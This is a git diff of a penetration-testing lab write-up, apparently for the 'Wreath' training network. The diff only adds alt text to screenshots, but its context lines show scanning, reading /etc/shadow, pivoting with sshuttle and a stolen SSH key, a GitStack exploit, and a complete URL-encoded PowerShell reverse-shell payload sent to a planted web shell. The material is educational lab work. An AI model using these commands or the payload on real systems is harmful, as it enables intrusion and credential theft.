@@ -54,11 +54,11 @@ Theres more than just us using this network, its shared. It will be nessecary fo
 
 - `sudo nmap -Pn -sS -p-`
 
-![](/assets/wreath01.png)
+![0xskar](/assets/wreath01.png)
 
 **What OS does Nmap think is running?**
 
-![](/assets/wreath02.png)
+![0xskar](/assets/wreath02.png)
 
 **Open the IP in your browser -- what site does the server try to redirect you to?**
 
@@ -82,7 +82,7 @@ We are provided with an exploit [here](https://github.com/MuirlandOracle/CVE-201
 
 We find the server is running as the root user. So we do not need to escalate priviliges here and can move onto the next step in exploitation. Since we only have a psuedoshell it would be nice to upgrade this to a full reverse shell. We can do this by typing `shell` into the pseudoshell. Then stabilize our new reverse shell.
 
-![](/assets/wreath03.png)
+![0xskar](/assets/wreath03.png)
 
 Since we have root we can get the root password hash with `cat /etc/shadow` 
 
@@ -98,7 +98,7 @@ Onto pivoting.
 
 Pivoting is using the information we have obtained to gain access to other machines on a network once we are inside a network. To access machines that were once inaccessible to us. 
 
-![](/assets/wreath04.png)
+![0xskar](/assets/wreath04.png)
 
 * * * 
 
@@ -290,7 +290,7 @@ Plink is notorious for going out of date quickly, which often results in failing
 
 Socat can be used to create encrypted port forwards in relays. Its unlikely to pass windows antivirus by default so must be modified
 
-![](/assets/wreath05.png)
+![0xskar](/assets/wreath05.png)
 
 > It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.
 
@@ -424,7 +424,7 @@ We are recommended to use sshuttle for the initial access point because of the f
 
 - `sudo sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i ./prod-serv/id_rsa" 10.200.105.0/24 -x 10.200.105.200` gets us access to the 105 machine on our attacker where visiting we come accoss a django server error page.
 
-![](/assets/wreath06.png)
+![0xskar](/assets/wreath06.png)
 
 - searching on our kali machine for an exploit `searchsploit gitstack` and copying the exploit to the working dir `searchsploit -m 43777`
 
@@ -446,7 +446,7 @@ After altering the code we run `./43777.py3.py` and get the exploit to run succe
 
 And with burp we can also get a response after adding content-type and changing the request to POST
 
-![](/assets/wreath07.png)
+![0xskar](/assets/wreath07.png)
 
 We can use burp to send multiple requests through repeater `systeminfo`
 
@@ -469,7 +469,7 @@ We are instructed for practice to setup a socat relay, and ensure that any ports
 - `curl -X POST http://10.200.101.150/web/exploit-0xskar.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.101.200%27%2C15069%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"`
 - with a netcat listener setup we recieve a connection.
 
-![](/assets/wreath08.png)
+![0xskar](/assets/wreath08.png)
 
 * * * 
 
